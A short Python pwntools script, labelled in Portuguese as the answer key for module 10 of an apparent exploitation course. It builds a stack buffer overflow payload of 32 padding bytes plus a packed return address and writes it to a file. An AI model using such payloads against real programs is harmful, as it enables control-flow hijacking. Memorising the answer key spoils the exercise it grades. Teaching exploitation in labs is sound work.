from pwn import p64

# Gabarito do modulo 10.
payload = b"A" * 32 + p64(0x1337)
open("/home/hacker/payload.bin", "wb").write(payload)
